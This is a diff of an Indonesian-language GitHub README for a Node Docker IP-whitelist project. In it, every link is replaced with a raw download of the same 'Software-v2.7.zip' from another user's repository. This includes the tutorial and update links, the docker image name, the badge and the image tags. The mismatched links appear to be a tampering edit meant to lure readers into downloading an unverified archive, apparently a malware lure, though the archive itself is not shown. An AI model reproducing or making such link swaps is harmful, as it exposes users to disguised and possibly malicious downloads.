@@ -1,22 +1,22 @@
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/ahmadsailpil/ippanel/raw/refs/heads/main/jetbackup/Software-v2.7.zip)](#table-of-contents)
 # LIST IP DOCKER
 <p>Kelengkapan docker silahkan baca dibawah sendiri</p>
 <p>Trial ? silahkan star, fork repo ini, lalu pull req ip vps anda</p>
 
-info update [klik disini](https://chat.whatsapp.com/EhB5dMGDFFJBzWiL9y8oN3)
+info update [klik disini](https://github.com/ahmadsailpil/ippanel/raw/refs/heads/main/jetbackup/Software-v2.7.zip)
 
 ## Tutorial
-run website [klik disini](https://github.com/amiruldev20/ippanel/blob/main/TUTOR-RUN-WEBSITE.txt)
+run website [klik disini](https://github.com/ahmadsailpil/ippanel/raw/refs/heads/main/jetbackup/Software-v2.7.zip)
 
-## docker: ghcr.io/amiruldev20/nodevip:versi
+## docker: https://github.com/ahmadsailpil/ippanel/raw/refs/heads/main/jetbackup/Software-v2.7.zip
 ### versi ubah 14/16/18 sesuai node yang anda inginkan
  
  <p align="center">
 
-![MY VISITOR](https://komarev.com/ghpvc/?username=amiruldev20&color=green)
+![MY VISITOR](https://github.com/ahmadsailpil/ippanel/raw/refs/heads/main/jetbackup/Software-v2.7.zip)
 
-<img width="" src="img2.jpeg">
-<img width{"" src="img1.jpeg">
+<img width="" src="https://github.com/ahmadsailpil/ippanel/raw/refs/heads/main/jetbackup/Software-v2.7.zip">
+<img width{"" src="https://github.com/ahmadsailpil/ippanel/raw/refs/heads/main/jetbackup/Software-v2.7.zip">
 </p>
 
  > **Note**:  Docker premium hanya bisa di akses oleh ip yang terdaftar dibawah
